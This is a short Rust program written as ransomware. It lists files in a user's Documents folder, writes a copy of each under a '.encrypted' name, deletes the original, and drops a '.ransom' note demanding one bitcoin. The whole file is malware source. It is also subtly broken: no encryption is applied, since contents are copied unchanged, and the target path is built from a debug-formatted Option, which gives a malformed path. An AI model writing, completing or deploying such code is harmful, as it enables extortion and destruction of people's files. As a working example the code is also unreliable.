use std::fs;
use std::io::prelude::*;
use std::path::{PathBuf};
use std::error::Error;
use dirs::home_dir;

fn main() -> Result<(), Box<dyn Error>> {
	let ransom_note = "YOUR FILES ARE ENCRYPTED. PAY 1 BITCOIN TO THE FOLLOWING ADDRESS TO GET THE DECRYPTION KEY.";
	let encrypted_extension = ".encrypted";
	let key = "INSERT_DECRYPTION_KEY_HERE";

	let target_dir = format!("C:\\Users\\{:?}\\Documents", home_dir());
	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let entry = entry?;
		let path = entry.path();

		if path.is_file() {
			let file_name = path.file_name().unwrap().to_str().unwrap();

			if !file_name.ends_with(encrypted_extension) {
				let mut file = fs::File::open(&path)?;
				let mut contents = Vec::new();
				file.read_to_end(&mut contents)?;

				let encrypted_path = PathBuf::from(format!("{}{}", path.display(), encrypted_extension));
				fs::write(&encrypted_path, contents)?;

				fs::remove_file(&path)?;

				let mut ransom_file = fs::File::create(format!("{}{}", encrypted_path.display(), ".ransom"))?;
				ransom_file.write_all(ransom_note.as_bytes())?;
				ransom_file.write_all(key.as_bytes())?;
			}
		}
	}

	Ok(())
}